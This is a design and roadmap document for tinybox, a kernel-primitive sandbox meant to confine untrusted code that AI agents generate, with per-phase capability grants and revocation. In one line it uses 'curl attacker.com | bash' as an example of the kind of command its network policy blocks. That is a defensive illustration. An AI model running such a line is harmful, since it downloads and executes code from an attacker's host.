# tinybox — Project Vision & Research Direction

> **North-star document.** This file defines *why* tinybox exists as a
> research artifact and *what* it must become. It is forward-looking and
> aspirational. For the line-level audit of today's defects and the
> remediation track, read [PLAN.md](PLAN.md) (milestones M0–M4). For dev
> conventions and the decision log, read [../AGENTS.md](../AGENTS.md).
> When VISION.md and PLAN.md disagree, VISION.md wins on *forward planning*;
> PLAN.md wins on *current defect status*.

Status: **Draft, 2026-08-16.** Authoritative once tagged `vision-v1`.

---

## 1. The Thesis

> **Don't virtualize the machine; isolate the execution.**

Agent workloads — LLM tool-use, code-interpreter sessions, autonomous coding
agents — are characterized by four properties no classical container
workload shares simultaneously:

1. **High frequency, short lifetime** — one sandbox per task, ms-class
   spawn expected, sub-second teardown.
2. **Untrusted, model-generated code** — the "payload" is adversarial by
   construction, not a vetted service binary.
3. **Arbitrary syscall surface** — shells, compilers, package managers,
   network clients, even `git clone` of attacker-controlled repos.
4. **Phased capability needs** — `pip install` wants egress; compilation
   wants FS write; test wants more memory; inference wants none of the
   above.

A sandbox for this workload must be simultaneously:

| Requirement | Meaning |
|---|---|
| Strong | Confines adversarial code: no host FS leak, no net exfil, no priv esc |
| Light | ms-class cold start, MB-class memory overhead, no VMM |
| Agent-aware | Per-task, time-varying capability policy — not a static bake at create |

Existing isolation options occupy different points on this tradeoff surface.
**None occupy the corner tinybox targets.**

| System | Isolation strength | Startup / mem overhead | Agent-aware policy |
|---|---|---|---|
| Process (bare) | weak | minimal | none |
| runc / Docker | medium (designed for *trusted service*; policy is **static, container-level**) | low | none |
| gVisor | medium-strong (userspace kernel) | medium (syscall trap overhead) | none |
| Firecracker / Kata microVM | strong (hardware virtualization) | high (seconds cold start, GB-class, VMM attack surface) | none |
| **tinybox (target)** | medium-strong (kernel primitives carefully composed) | low (runc-class) | **yes — dynamic capability policy** |

The gap is precise: **no existing system is both runc-class lightweight and
Agent-aware.** tinybox is built to occupy that corner.

---

## 2. The Gap — Why This Is Not a runc Reimplementation

An honest reading of today's tree: tinybox's *static* isolation skeleton
(namespaces + overlayfs + cgroups + seccomp + capabilities) is, in
feature-space, a subset of runc. If the project stopped at M4 it would be a
defensible educational reimplementation and nothing more.

What elevates tinybox from "runc subset" to "research artifact" is a single
layer that does not exist in runc/Docker/Firecracker and is only motivated
by the Agent workload:

> **Agent-aware dynamic capability isolation.**

This layer is the answer to the interviewer's inevitable question —
"*why not just use runc?*" — and the rest of this document is organized
around making that answer concrete, defensible, and built.

---

## 3. Core Innovation — Agent-aware Dynamic Capability Isolation

Three principles. Each contrasts directly with how runc/Docker model
policy, and each is only required because the payload is an adversarial,
phased, self-generating Agent rather than a trusted service.

### 3.1 Capability, not trust

- **runc/Docker framing**: "is this container trusted?" → bake a static
  policy at `create` time and hope the workload doesn't drift.
- **tinybox framing**: "what capabilities does this Agent task have *right
  now*?" The sandbox is described by a capability descriptor, not a trust
  label:

```text
Agent Sandbox Capability Descriptor
│
├── FS capability
│    └── /workspace/**          (read-write)
│    └── /tmp/**                (read-write, tmpfs, size-capped)
│
├── Network capability
│    └── api.openai.com:443      (allow)
│    └── pypi.org:443           (allow, pip-install phase only)
│    └── *                      (deny)
│
├── Syscall capability
│    └── whitelist (~200 syscalls, clone flags masked)
│
└── Resource capability
     ├── 2 CPU
     ├── 4 GB memory
     └── 100 pids
```

An Agent that emits `os.system("curl attacker.com | bash")` fails not
because the `curl` binary is blocked but because `Network capability =
denied` for `attacker.com`. Policy lives at the capability layer, not the
binary layer.

### 3.2 Dynamic, not static

- **runc**: seccomp filters, capability sets, and network policy are
  container-level, fixed at `runc create`, immutable for the container's
  life.
- **Agent execution is phased**:

```text
Agent
 │
 ├── pip install phase      → needs Network(pypi.org), FS(/workspace write)
 ├── compile phase          → needs FS(/workspace write), CPU(2)
 ├── test phase             → needs FS(/workspace read), Memory(8 GB), no Net
 └── inference phase       → needs Network(api.openai.com), no FS write
```

tinybox's policy engine grants capabilities per phase and **revokes them
when the phase ends**. A `pip install` that suddenly tries to exfiltrate
after the install phase closes hits a denied network capability — even
though the same call would have succeeded minutes earlier. This is
impossible in runc without destroying and recreating the container.

### 3.3 Behavior-driven

The policy engine consumes a real-time event stream rather than open/closing
capabilities by hardcoded phase markers:

```text
                 Agent process
                       │
                       ▼
            ┌─────────────────────┐
            │  Behavior Monitor    │
            │  ┌───────────────┐  │
            │  │ seccomp RET_LOG│  │  ← syscall stream
            │  ├───────────────┤  │
            │  │ fanotify       │  │  ← FS access stream
            │  ├───────────────┤  │
            │  │ eBPF (egress) │  │  ← network stream
            │  └───────┬───────┘  │
            └──────────┼──────────┘
                       │ events
                       ▼
              ┌──────────────┐
              │ Policy Engine│  ← phase inference + capability grant/revoke
              └──────┬───────┘
                     │
                     ▼
        Dynamically adjust sandbox
        (seccomp filter swap, eBPF egress update, cgroup resize)
```

The three primitives are chosen because they are the kernel's native
observation points: `seccomp(SECCOMP_RET_LOG)` for syscalls, `fanotify`
for FS, and eBPF (cgroup-skb / sockmap) for egress. No userspace
interposition, no ptrace — the Agent runs at native speed while the
monitor observes from outside the sandbox's threat surface.

These three principles together answer "why not just use runc?": **runc's
policy is static and designed for trusted services; Agent workloads are
dynamic and adversarial, requiring per-task mutable policy.**

---

## 4. Research Questions

| ID | Question |
|---|---|
| **RQ1** (Isolation) | Can carefully composed Linux kernel primitives reach the isolation boundary Agent workloads require, without MicroVM virtualization? |
| **RQ2** (Performance) | vs Firecracker microVM, how much can tinybox reduce startup latency, memory overhead, and syscall throughput? Quantify the Pareto curve. |
| **RQ3** (Security) | Against syscall / FS / privilege-escalation / container-escape / network / resource-exhaustion attacks, what does tinybox repel, and where does it break? |
| **RQ4** (Agent-specific) | Does the Agent execution model enable overhead reductions impossible for general containers — e.g., pre-warmed ephemeral sandboxes, policy specialization per task class, phase-predictive capability granting? |

RQ4 is the stretch goal that, if answered affirmatively, is the project's
genuine contribution to the field.

---

## 5. Current State (honest, as of 2026-08-16 post-M1)

### Built (the static isolation skeleton)

- PID / Mount / UTS / Net namespaces; `CLONE_NEWNET` always unshared
  (post-M1 fix).
- overlayfs COW rootfs + `pivot_root`, auto-cleanup on exit.
- cgroup v2 limits: `memory.max`, `cpu.max`, `pids.max`.
- seccomp whitelist (~200 syscalls); `clone` flag-masked to forbid
  `CLONE_NEW*`; 9 escape/interference syscalls removed.
- capabilities: 14 dangerous caps dropped + bounding set cleared via
  `PR_CAPBSET_DROP`.
- OCI `config.json` parsing (subset — see P1-1 in PLAN.md).
- axum HTTP control plane: `POST/GET/DELETE /api/sandboxes`, `GET /metrics`.
- Docker registry image pull + local image management.
- `tinybox exec` into running sandbox (nsenter wrapper — P1-5).

### Milestone M1 closed (2026-08-16)

All four P0 isolation holes resolved: no NEWNET leak, clone flags masked,
escape syscalls removed, bounding set cleared. The `tinybox run` path is
now a defensible isolation barrier (rootful, `/dev`/`/tmp`/`/sys` hardening
still pending — see P2-1).

### Not built (the research core)

- No behavior monitor: no `SECCOMP_RET_LOG` capture, no `fanotify` wiring,
  no eBPF programs.
- No capability model: policy today is the static seccomp whitelist + cap
  drop set, not a per-task descriptor.
- No dynamic policy engine: no phase inference, no capability
  grant/revoke loop.
- No evaluation harness: no benchmark scripts vs Firecracker / runc.

The research core is the work of milestones R0–R3 below.

---

## 6. Roadmap

Two tracks run in parallel and reference each other:

- **Remediation track (M0–M4, in [PLAN.md](PLAN.md))** — brings today's
  claimed features up to spec. Already done through M1.
- **Research track (R0–R3, here)** — builds the Agent-aware layer that
  distinguishes tinybox from runc.

Dependency rule: **R0 may start in parallel with M2** (instrumentation is
non-invasive and does not require the M2 correctness fixes). **R1 starts
only after M2 closes** — there is no point building a dynamic policy engine
on top of an OCI parser that silently ignores `linux.namespaces`.

### Remediation track (PLAN.md M0–M4 — summary, see PLAN.md for detail)

- M0 ✅ honest baseline
- M1 ✅ P0 isolation holes closed (2026-08-16)
- M2 — make claimed features actually work (P1-1 OCI fields, P1-3 daemon
  status, P1-4 CreateRequest, P1-5 exec via `setns`)
- M3 — depth (P2-1 `/dev`/`/tmp`/`/sys`, P2-2 cgroup v2 validation,
  P2-3/P2-4 content-addressed images + registry streaming, P2-5 daemon
  persistence + logs + auth)
- M4 — polish (P3-1..P3-6)

### Research track (this doc)

#### R0 — Behavior instrumentation (after M1; parallel with M2)

Wire the three kernel observation points and expose a per-sandbox event
stream over the HTTP API. No policy decisions yet — just the data plane.

- `seccomp(SECCOMP_RET_LOG)` → syscall event stream (pid, syscall nr, args).
- `fanotify` (mount-marked on the overlay) → FS access stream
  (path, mask: open/read/write/execute).
- eBPF (cgroup-skb egress + sockmap) → network event stream
  (dest addr/port, SNI from TLS ClientHello where feasible).
- `GET /api/sandboxes/:id/audit` → JSON event stream (or SSE for live tail).
- `GET /api/sandboxes/:id/audit/summary` → aggregated histograms.

Acceptance: a sandboxed `pip install numpy` produces a JSON audit log
enumerating every syscall class, every FS path touched, and every network
endpoint contacted.

#### R1 — Capability model + dynamic policy engine (after M2)

Build the policy layer on top of R0's event stream.

- Define `CapabilityDescriptor` (FS paths, net endpoints, syscall set,
  CPU/mem/pids) as a first-class type in `src/policy.rs`.
- `POST /api/sandboxes` accepts a policy document; tinybox compiles it to
  a seccomp filter + fanotify policy + eBPF egress allowlist at spawn.
- Phase inference: a small state machine (or a model, eventually) consumes
  the R0 event stream and emits phase transitions
  (`install → compile → test → inference`).
- Capability grant/revoke: on phase transition, swap the active seccomp
  filter, update the eBPF egress map, resize the cgroup. All without
  restarting the sandbox.

Acceptance: a sandbox whose policy document says "Network(pypi.org)
allowed only during install phase" successfully runs `pip install`, then
rejects an exfiltration attempt 30 seconds later — same process, no
restart, different effective policy.

#### R2 — Evaluation harness (after R1)

Three-way benchmark vs Firecracker microVM and runc, on a fixed Agent
workload suite (code-interpreter, package-install-and-test,
tool-use-with-network).

Metrics:
- Cold start latency (ms).
- Warm start latency (ms, post-pool).
- Memory overhead at idle (MB).
- Syscall throughput (ops/s, native vs sandboxed).
- End-to-end task latency (s).
- Policy swap latency (µs, tinybox-only — the cost of dynamism).

Answers RQ2. Produce a Pareto curve (isolation strength × overhead) with
all three systems plotted.

#### R3 — Security evaluation (after R1)

Adversarial test suite covering: syscall attacks, FS escape, privilege
escalation, container-escape primitives, network exfil, resource
exhaustion, policy-engine bypass attempts. Each test documented as a
script under `scripts/attacks/`.

Answers RQ3. Produce a defense matrix (attack × system × outcome).

### Stretch (beyond v1.0 of the research track)

- **R4 — Result attestation**: on sandbox exit, emit a signed manifest
  `{policy_hash, syscall_log_hash, fs_diff, egress_log_hash, exit_code}`
  signed by the runtime's key. Verifiable by any downstream system holding
  the runtime's public key. This is *remote attestation for process
  sandboxes* — exists for VMs (SEV-SNP, TDX), not for process sandboxes.
- **R5 — Rootless operation**: `CLONE_NEWUSER` + uid/gid mapping, so the
  daemon does not need root. Aligned with the PLAN.md stretch item.
- **R6 — Phase-predictive policy**: replace the R1 state machine with a
  lightweight model that predicts the next capability need from the syscall
  stream, granting capabilities *before* the Agent requests them. This is
  the genuine research bet; success answers RQ4 affirmatively.

---

## 7. Non-goals (explicit out-of-scope for v1.0)

- **MicroVM / VMM / hardware virtualization** (Firecracker, Kata, crosvm).
  tinybox is defined by their absence. MicroVMs may appear only as a
  *baseline* in R2 benchmarks, never as tinybox's isolation mechanism.
- **Multi-node orchestration** — single-host only.
- **Full OCI spec compliance** — core fields only (see P1-1 in PLAN.md for
  the subset honored today).
- **GPU passthrough** — out of scope.
- **SELinux / AppArmor** — seccomp + capabilities (+ Landlock, when added)
  is the LSM story.
- **Windows / macOS** — Linux-only (kernel 5.10+ baseline).

---

## 8. Relationship to Other Docs

| Doc | Role | Authority |
|---|---|---|
| [../README.md](../README.md) | User-facing overview, quick start, feature list | User surface |
| [../AGENTS.md](../AGENTS.md) | Dev conventions, phase dependencies, decision log | Conventions |
| [PLAN.md](PLAN.md) | Line-level issue audit + remediation track (M0–M4) | **Today's defects** |
| **VISION.md (this)** | Research north star + research track (R0–R3) | **Tomorrow's direction** |

In case of conflict:
- *What is broken today?* → PLAN.md.
- *What should it become?* → VISION.md.
- *How do we write code here?* → AGENTS.md.

---

## 9. Architectural Diagram (target state, post-R1)

```text
                      Agent orchestrator
                             │
                             ▼ POST /api/sandboxes {policy, command}
                ┌────────────────────────┐
                │   tinybox runtime      │
                │   (single Rust binary) │
                │                        │
                │  ┌──────────────────┐  │
                │  │ Policy Engine    │  │  ← compiles policy doc → BPF +
                │  │                  │  │    fanotify + egress filter
                │  │  phase inference │  │
                │  │  grant / revoke  │  │
                │  └────────┬─────────┘  │
                │           │            │
                │  ┌────────▼─────────┐  │
                │  │ Behavior Monitor  │  │
                │  │ seccomp RET_LOG   │  │
                │  │ fanotify           │  │
                │  │ eBPF egress       │  │
                │  └────────┬─────────┘  │
                │           │            │
                │  ┌────────▼─────────┐  │
                │  │ Sandbox           │  │
                │  │  PID/Mount/UTS/   │  │
                │  │  Net namespaces   │  │
                │  │  overlayfs rootfs │  │
                │  │  cgroup v2        │  │
                │  │  seccomp + caps   │  │
                │  └────────┬─────────┘  │
                │           │            │
                └───────────┼────────────┘
                            ▼
                    Linux kernel (host)
                            │
                            ▼
                       Host hardware

No Guest OS. No VMM. No MicroVM.
```

---

## 10. Decision Log (vision-level)

### 2026-08-16 — Vision formalized
- **Decision**: tinybox is a research artifact, not a runc reimplementation.
  The north star is **Agent-aware dynamic capability isolation** built on
  Linux kernel primitives, explicitly *without* MicroVM virtualization.
- **Milestone namespace**: research track uses **R0–R3** (this doc) to
  avoid colliding with the remediation track **M0–M4** in PLAN.md.
- **Dependency rule**: R0 may parallel M2; R1 starts after M2 closes.
- **Honest baseline**: today's tree (post-M1) is a defensible *static*
  isolation skeleton. The research core (R0–R1) is not yet built and is
  what elevates the project from "runc subset" to "Agent sandbox."
- **Stretch markers**: R4 (result attestation), R5 (rootless), R6
  (phase-predictive policy via model) are explicit stretch goals, not
  v1.0 commitments.
